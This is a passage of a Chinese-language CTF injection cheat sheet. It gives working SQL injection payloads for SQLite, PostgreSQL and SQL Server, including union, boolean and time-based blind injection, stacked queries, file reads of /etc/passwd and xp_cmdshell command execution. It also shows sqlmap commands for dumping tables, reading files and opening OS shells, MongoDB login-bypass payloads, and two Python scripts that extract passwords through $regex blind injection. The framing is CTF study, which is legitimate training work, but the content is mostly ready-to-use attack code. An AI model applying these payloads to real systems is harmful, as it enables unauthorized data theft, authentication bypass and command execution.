1' and case when unicode(substr(sqlite_version(),1,1))=【Unicode编码】 then randomblob(100000000) else 1 end -- 

# 递归查询
1' and case when unicode(substr(sqlite_version(),1,1))=【Unicode编码】 then (with recursive r(i) as (select 1 union all select i+1 from r limit 1000000) select count(*) from r) else 1 end -- 
```

#### 19.3.6 堆叠注入

```sql
1'; select sqlite_version(); -- 
1'; create table 【新表名】(【列名1】 int,【列名2】 text); -- 
1'; insert into 【表名】 values(【值1】,'【写入内容】'); -- 
1'; update 【表名】 set 【列名】='【新值】' where 【条件列】='【条件值】'; -- 
```

### 19.4 PostgreSQL

#### 19.4.1 PostgreSQL 常见差异

| 作用 | PostgreSQL 写法 |
| --- | --- |
| 查版本 | `version()` |
| 查当前数据库 | `current_database()` / `current_catalog` |
| 查当前用户 | `current_user` / `session_user` |
| 查当前 Schema | `current_schema()` |
| 查数据库 | `pg_database` |
| 查表 | `pg_catalog.pg_tables` / `information_schema.tables` |
| 查列 | `information_schema.columns` / `pg_catalog` |
| 拼接字符串 | `||` / `concat()` |
| 拼接多行 | `string_agg()` |
| 截取字符串 | `substring()` / `substr()` |
| 字符转编码 | `ascii()` |
| 编码转字符 | `chr()` |
| 延时 | `pg_sleep()` |
| 分页 | `limit 【数量】 offset 【偏移量】` |
| 文件读取 | `pg_read_file()` / `pg_read_binary_file()` |
| 执行程序 | `copy ... program` |

#### 19.4.2 枚举数据库和表

```sql
# 版本
-1' union select 1,version(),3 -- 

# 当前数据库
-1' union select 1,current_database(),3 -- 

# 所有数据库
-1' union select 1,string_agg(datname,','),3 from pg_database -- 

# 所有表
-1' union select 1,string_agg(tablename,','),3 from pg_catalog.pg_tables where schemaname not in ('pg_catalog','information_schema') -- 

# 指定表的列
-1' union select 1,string_agg(column_name,','),3 from information_schema.columns where table_schema='public' and table_name='【表名】' -- 

# 字段内容
-1' union select 1,string_agg(【列名】::text,','),3 from public.【表名】 -- 
```

#### 19.4.3 Union 注入和严格类型

```sql
-1' union select null,null,null -- 
-1' union select null,'test',null -- 
-1' union select null,null::text,null -- 
-1' union select null,version()::text,null -- 
```

#### 19.4.4 Dollar-quoted 字符串

```sql
$$admin$$
$tag$admin$tag$
table_name=$$users$$
table_schema=$$public$$
```

#### 19.4.5 时间盲注

```sql
1';select pg_sleep(5) -- 
1' and (select count(*) from pg_sleep(5))=1 -- 
1' and (select count(*) from pg_sleep(case when length(current_database())=【长度】 then 5 else 0 end))=1 -- 
```

#### 19.4.6 文件读取

```sql
select pg_read_file('/etc/passwd');
select pg_read_binary_file('/flag');
-1' union select 1,pg_read_file('/flag'),3 -- 
```

### 19.5 SQL Server

#### 19.5.1 SQL Server 常见差异

| 作用 | SQL Server 写法 |
| --- | --- |
| 查版本 | `@@version` |
| 查当前数据库 | `db_name()` |
| 查服务器登录 | `suser_sname()` / `system_user` |
| 查数据库用户 | `user_name()` / `user` |
| 查数据库 | `sys.databases` |
| 查表 | `sys.tables` / `information_schema.tables` |
| 查列 | `sys.columns` / `information_schema.columns` |
| 拼接字符串 | `+` / `concat()` |
| 拼接多行 | `string_agg()`（SQL Server 2017+） |
| 截取字符串 | `substring()` |
| 字符转编码 | `ascii()` / `unicode()` |
| 编码转字符 | `char()` / `nchar()` |
| 延时 | `waitfor delay` |
| 限制行数 | `top` / `offset ... fetch next` |
| 命令执行 | `xp_cmdshell`（通常默认禁用） |

#### 19.5.2 枚举数据库和表

```sql
# 版本
-1' union select 1,@@version,3 -- 

# 当前数据库
-1' union select 1,db_name(),3 -- 

# 所有数据库
-1' union select 1,(select string_agg(name,',') from sys.databases),3 -- 

# 所有表
-1' union select 1,(select string_agg(name,',') from sys.tables),3 -- 

# 指定表的列
-1' union select 1,(select string_agg(name,',') from sys.columns where object_id=object_id('dbo.【表名】')),3 -- 

# 字段内容
-1' union select 1,(select string_agg(cast(【列名】 as varchar(max)),',') from dbo.【表名】),3 -- 
```

#### 19.5.3 布尔盲注

```sql
1' and len(db_name())=【长度】 -- 
1' and ascii(substring(db_name(),1,1))=【ASCII】 -- 
1' and ascii(substring((select top 1 name from sys.tables order by name),【位置】,1))=【ASCII】 -- 
```

#### 19.5.4 时间盲注

```sql
1';waitfor delay '0:0:5' -- 
1';if len(db_name())=【长度】 waitfor delay '0:0:5' -- 
1';if ascii(substring(db_name(),1,1))>【ASCII】 waitfor delay '0:0:5' -- 
```

#### 19.5.5 文件读取和 xp_cmdshell

```sql
# 文件读取
select bulkcolumn from openrowset(bulk N'C:\flag.txt',single_clob) as x;

# 命令执行（如果启用）
exec master..xp_cmdshell 'whoami';
exec master..xp_cmdshell 'type C:\flag.txt';
```

## 20. sqlmap 使用

### 20.1 基础使用

```bash
sqlmap --version
sqlmap -h
sqlmap -hh
```

### 20.2 检测 GET 参数

```bash
sqlmap -u "http://target/index.php?id=1" -p id
sqlmap -u "http://target/index.php?id=1" -p id --batch
```

### 20.3 检测 POST 参数

```bash
sqlmap -u "http://target/login.php" \
  --data="username=admin&password=123456" \
  -p username

sqlmap -u "http://target/login.php" \
  --data="username=admin&password=123456" \
  -p password

sqlmap -u "http://target/login.php" \
  --data="username=admin&password=123456" \
  -p "username,password"
```

### 20.4 使用 BurpSuite 原始请求文件

```bash
sqlmap -r request.txt -p id
sqlmap -r request.txt -p id --force-ssl
```

原始请求文件示例：

```http
POST /api/user HTTP/1.1
Host: target
Content-Type: application/json
Cookie: PHPSESSID=abcdef123456

{"id":1,"name":"test"}
```

请求头和请求体之间必须有一个空行。

### 20.5 手动指定注入位置

使用 `*` 标记测试位置：

```bash
sqlmap -u "http://target/user/1*" --batch
sqlmap -u "http://target/index.php?id=1*" --batch
sqlmap -u "http://target/index.php" --cookie="PHPSESSID=abcdef; uid=1*" --batch
sqlmap -u "http://target/index.php" -H "X-Forwarded-For: 127.0.0.1*" --batch
```

### 20.6 查询数据库中的数据

```bash
# 查询当前数据库
sqlmap -u "http://target/index.php?id=1" -p id --current-db

# 查询当前用户
sqlmap -u "http://target/index.php?id=1" -p id --current-user

# 判断 DBA 权限
sqlmap -u "http://target/index.php?id=1" -p id --is-dba

# 查询所有数据库
sqlmap -u "http://target/index.php?id=1" -p id --dbs

# 查询指定数据库的表
sqlmap -u "http://target/index.php?id=1" -p id -D 【数据库名】 --tables

# 查询指定表的列
sqlmap -u "http://target/index.php?id=1" -p id -D 【数据库名】 -T 【表名】 --columns

# 读取全部字段
sqlmap -u "http://target/index.php?id=1" -p id -D 【数据库名】 -T 【表名】 --dump

# 读取指定列
sqlmap -u "http://target/index.php?id=1" -p id -D 【数据库名】 -T 【表名】 -C "username,password,flag" --dump

# 条件查询
sqlmap -u "http://target/index.php?id=1" -p id -D 【数据库名】 -T 【表名】 --where="id=1" --dump

# 搜索表
sqlmap -u "http://target/index.php?id=1" -p id --search -T flag

# 搜索列
sqlmap -u "http://target/index.php?id=1" -p id --search -C "flag,secret,token"
```

推荐查询顺序：

```txt
--current-db
--dbs
-D 【数据库名】 --tables
-D 【数据库名】 -T 【表名】 --columns
-D 【数据库名】 -T 【表名】 -C 【列名】 --dump
```

不要一开始就使用 `--dump-all`。

### 20.7 level 和 risk

```bash
# level 1-5，默认 1
sqlmap -u "http://target/index.php?id=1" -p id --level=3
sqlmap -u "http://target/index.php?id=1" -p id --level=5

# risk 1-3，默认 1
sqlmap -u "http://target/index.php?id=1" -p id --level=3 --risk=2
```

| level | 大致作用 |
| --- | --- |
| 1 | 基础检测，GET 和 POST 参数都会测试 |
| 2 | 增加测试内容，检测 Cookie 参数 |
| 3 | 检测 User-Agent、Referer 等位置 |
| 4 | 使用更多 payload 和闭合方式 |
| 5 | 检测范围最大，检测 Host 等位置 |

| risk | 大致作用 |
| --- | --- |
| 1 | 风险较低的基础测试 |
| 2 | 增加较重的时间盲注测试 |
| 3 | 增加 OR 类型等可能影响更多数据的测试 |

### 20.8 指定注入类型

```bash
# B: 布尔盲注, E: 报错注入, U: Union, S: 堆叠, T: 时间盲注, Q: 内联查询
sqlmap -u "http://target/index.php?id=1" -p id --technique=B
sqlmap -u "http://target/index.php?id=1" -p id --technique=U
sqlmap -u "http://target/index.php?id=1" -p id --technique=EU
sqlmap -u "http://target/index.php?id=1" -p id --technique=B --dbs

# 指定数据库类型
sqlmap -u "http://target/index.php?id=1" -p id --dbms=MySQL

# 指定列数
sqlmap -u "http://target/index.php?id=1" -p id --technique=U --union-cols=4
```

### 20.9 帮助 sqlmap 判断真假页面

```bash
# 真页面特征
sqlmap -u "http://target/index.php?id=1" -p id --string="Welcome"

# 假页面特征
sqlmap -u "http://target/index.php?id=1" -p id --not-string="User not found"

# 状态码
sqlmap -u "http://target/index.php?id=1" -p id --code=200
```

### 20.10 查看 sqlmap 发送的 payload

```bash
# 详细程度 1-6
sqlmap -u "http://target/index.php?id=1" -p id -v 3
sqlmap -u "http://target/index.php?id=1" -p id -v 4

# 保存流量到文件
sqlmap -u "http://target/index.php?id=1" -p id -t traffic.txt -v 3

# 通过 BurpSuite 查看
sqlmap -u "http://target/index.php?id=1" -p id --proxy="http://127.0.0.1:8080"
```

### 20.11 tamper 脚本

```bash
# 列出可用 tamper
sqlmap --list-tampers

# 使用单个 tamper
sqlmap -u "http://target/index.php?id=1" -p id --tamper=space2comment

# 组合多个
sqlmap -u "http://target/index.php?id=1" -p id --tamper="between,randomcase,space2comment"
```

| 脚本 | 常见作用 |
| --- | --- |
| `space2comment` | 尝试使用注释替代空格 |
| `randomcase` | 改变 SQL 关键字大小写 |
| `between` | 尝试使用 `between` 改写部分比较条件 |

### 20.12 Session 缓存

```bash
# 清除 Session
sqlmap -u "http://target/index.php?id=1" -p id --flush-session

# 重新执行查询
sqlmap -u "http://target/index.php?id=1" -p id --fresh-queries --dbs
```

### 20.13 提高盲注读取速度

```bash
# 并发线程
sqlmap -u "http://target/index.php?id=1" -p id --technique=B --threads=5 --dbs

# 调整延迟时间
sqlmap -u "http://target/index.php?id=1" -p id --technique=T --time-sec=3

# 限制字符集
sqlmap -u "http://target/index.php?id=1" -p id --charset="0123456789abcdef" --dump
```

### 20.14 登录状态、CSRF Token

```bash
# 提供 Cookie
sqlmap -u "http://target/index.php?id=1" -p id --cookie="PHPSESSID=abcdef123456"

# CSRF Token
sqlmap -r request.txt -p id --csrf-token=csrf_token
sqlmap -r request.txt -p id --csrf-token=csrf_token --csrf-url="http://target/form.php"
```

### 20.15 二次注入

```bash
sqlmap -r register.txt -p username --second-url="http://target/profile.php"
sqlmap -r register.txt -p username --second-req=profile.txt
```

### 20.16 文件读取和高级功能

```bash
# 文件读取
sqlmap -u "http://target/index.php?id=1" -p id --file-read="/flag"
sqlmap -u "http://target/index.php?id=1" -p id --file-read="/etc/passwd"

# 自定义查询
sqlmap -u "http://target/index.php?id=1" -p id --sql-query="select database()"

# 交互式 SQL Shell
sqlmap -u "http://target/index.php?id=1" -p id --sql-shell

# 系统命令 Shell
sqlmap -u "http://target/index.php?id=1" -p id --os-shell
```

### 20.17 CTF 推荐流程

1. 使用浏览器或 BurpSuite 发送一次正常请求。
2. 手工测试单引号、永真条件和永假条件。
3. 判断可能存在注入的参数。
4. 把完整请求保存成 `request.txt`。
5. 使用 sqlmap 检测：

```bash
sqlmap -r request.txt -p 【参数名】 -v 3
```

6. 如果页面真假特征明显，主动指定：

```bash
--string="【真页面特征】"
```

7. 确认注入后，按顺序查询：

```bash
sqlmap -r request.txt -p 【参数名】 --current-db
sqlmap -r request.txt -p 【参数名】 --dbs
sqlmap -r request.txt -p 【参数名】 -D 【数据库名】 --tables
sqlmap -r request.txt -p 【参数名】 -D 【数据库名】 -T 【表名】 --columns
sqlmap -r request.txt -p 【参数名】 -D 【数据库名】 -T 【表名】 -C 【列名】 --dump
```

8. 检测不到时，依次检查：请求是否正常、Cookie 是否有效、参数位置是否正确、页面真假标志是否稳定、Session 是否需要清理。

## 21. NoSQL 注入

NoSQL 注入是指后端把用户可控数据直接放进 NoSQL 查询结构，导致用户能够改变原本的查询条件。CTF 中最常见的是 MongoDB 查询选择器注入。

### 21.1 NoSQL 注入基础

MongoDB 使用文档保存数据：

```json
{
  "_id": "...",
  "username": "admin",
  "password": "secret",
  "role": "admin",
  "flag": "flag{test}"
}
```

正常登录查询：

```javascript
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password
});
```

JSON 不只能表示字符串，也可以表示对象：

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

`$ne` 表示"不等于"。这条查询不再要求用户名和密码等于攻击者输入的字符串，而是匹配用户名和密码不等于 `null` 的文档。

SQL 注入与 MongoDB 注入的区别：

| 对比项 | SQL 注入 | MongoDB 查询选择器注入 |
| --- | --- | --- |
| 主要载体 | SQL 字符串 | JavaScript / JSON 查询对象 |
| 常见目标 | 闭合引号并拼接 SQL | 把普通字段值变成 `$ne`、`$regex` 等对象 |
| 常见输入 | `' or 1=1 --` | `{"$ne": null}` |
| 关键检查 | 最终 SQL 字符串 | 解析后的字段类型和最终查询过滤器 |

### 21.2 MongoDB 查询操作符

| 操作符 | 作用 | 示例 |
| --- | --- | --- |
| `$ne` | 不等于 | `{"username":{"$ne":null}}` |
| `$gt` | 大于 | `{"age":{"$gt":0}}` |
| `$gte` | 大于等于 | `{"level":{"$gte":1}}` |
| `$lt` | 小于 | `{"age":{"$lt":100}}` |
| `$in` | 位于指定集合 | `{"role":{"$in":["admin","user"]}}` |
| `$nin` | 不位于指定集合 | `{"role":{"$nin":["guest"]}}` |
| `$exists` | 字段是否存在 | `{"flag":{"$exists":true}}` |
| `$regex` | 使用正则表达式匹配字符串 | `{"password":{"$regex":"^flag"}}` |
| `$or` | 多个条件满足一个即可 | `{"$or":[{"role":"admin"},{"vip":true}]}` |
| `$and` | 多个条件都要满足 | `{"$and":[{"role":"admin"},{"vip":true}]}` |
| `$where` | 使用服务端 JavaScript 判断 | `{"$where":"this.role === 'admin'"}` |

### 21.3 身份认证绕过

```json
// 任意非 null 用户和密码
{"username":{"$ne":null},"password":{"$ne":null}}

// 指定管理员，绕过密码
{"username":"admin","password":{"$ne":null}}

// 使用 $regex 指定用户
{"username":{"$regex":"^admin$"},"password":{"$ne":null}}

// 使用 $gt 绕过
{"username":{"$gt":""},"password":{"$gt":""}}
```

### 21.4 JSON 与表单传参

JSON 请求：

```http
POST /login HTTP/1.1
Host: target
Content-Type: application/json

{"username":"admin","password":{"$ne":null}}
```

URL 编码表单：

```txt
username=admin&password[$ne]=x
```

URL 编码后：

```txt
username=admin&password[%24ne]=x
```

Query 参数中的 JSON：

```txt
/login?filter={"username":"admin","password":{"$ne":null}}
```

### 21.5 $regex 盲注

```json
{"username": "admin", "password": {"$regex": "^f"}}
{"username": "admin", "password": {"$regex": "^fl"}}
{"username": "admin", "password": {"$regex": "^.{8}$"}}
```

### 21.6 $regex 盲注脚本

```python
import re
import string
import requests

url = 'http://target/login'
username = 'admin'
alphabet = string.ascii_letters + string.digits + '_{}-@!'
known = ''
max_length = 128

def oracle(prefix):
    pattern = '^' + re.escape(prefix)
    response = requests.post(
        url,
        json={
            'username': username,
            'password': {'$regex': pattern}
        },
        timeout=5
    )
    return 'login success' in response.text

for _ in range(max_length):
    found = False
    for char in alphabet:
        candidate = known + char
        if oracle(candidate):
            known = candidate
            found = True
            print('[+]', known)
            break
    if not found:
        break

print('result:', known)
```

### 21.7 完整自动化脚本

```python
import re
import string
import sys
import requests

target = 'http://target/login'
target_user = 'admin'
alphabet = string.ascii_letters + string.digits + '_{}-@!$.'
max_length = 128

session = requests.Session()

def send_password_filter(password_filter):
    response = session.post(
        target,
        json={
            'username': target_user,
            'password': password_filter
        },
        timeout=5,
        allow_redirects=False
    )
    return response

def is_true(response):
    return (
        response.status_code in {200, 302}
        and 'login failed' not in response.text
    )

def check_oracle():
    true_response = send_password_filter({'$regex': '.*'})
    false_response = send_password_filter({'$regex': 'a^'})
    print('[*] true :', true_response.status_code, len(true_response.content))
    print('[*] false:', false_response.status_code, len(false_response.content))
    if is_true(true_response) == is_true(false_response):
        print('[-] 真假条件无法稳定区分，请先修改 is_true()')
        return False
    return True

def extract_prefix():
    known = ''
    for _ in range(max_length):
        found = False
        for char in alphabet:
            candidate = known + char
            pattern = '^' + re.escape(candidate)
            response = send_password_filter({'$regex': pattern})
            if is_true(response):
                known = candidate
                found = True
                print('[+]', known)
                break
        if not found:
            break
    return known

if not check_oracle():
    sys.exit(1)

result = extract_prefix()
print('[+] result:', result)
```

### 21.8 速查 Payload

```json
// 任意非 null 用户和密码
{"username":{"$ne":null},"password":{"$ne":null}}

// 指定管理员，绕过密码
{"username":"admin","password":{"$ne":null}}

// 指定管理员，密码字段存在
{"username":"admin","password":{"$exists":true}}

// 判断密码前缀
{"username":"admin","password":{"$regex":"^flag"}}

// 表单嵌套对象写法，是否生效取决于解析器
username=admin&password[%24ne]=x
```

### 21.9 最终记忆

```txt
SQL 注入关注最终 SQL 字符串。
MongoDB NoSQL 注入关注解析后的对象类型和最终查询过滤器。
```
